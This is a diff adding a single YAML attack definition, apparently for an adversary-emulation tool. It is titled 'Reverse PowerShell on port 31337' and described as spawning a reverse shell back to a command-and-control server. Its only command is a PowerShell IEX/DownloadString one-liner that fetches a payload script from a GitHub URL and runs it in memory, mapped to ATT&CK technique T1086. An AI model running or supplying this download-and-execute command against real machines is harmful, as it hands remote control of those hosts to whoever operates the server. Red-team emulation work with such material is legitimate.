@@ -1,0 +1,11 @@
+- description: Spawns a reverse PowerShell back to C2 sever
+  id: d9bc3cad-632e-4155-b14c-57b1afec87cb
+  name: Reverse PowerShell on port 31337
+  platforms:
+    windows:
+      psh:
+        command: IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/bryanmacainag/artofwar/master/payloads/sjkhdxoi.ps1")
+  tactic: execution
+  technique:
+    attack_id: T1086
+    name: PowerShell
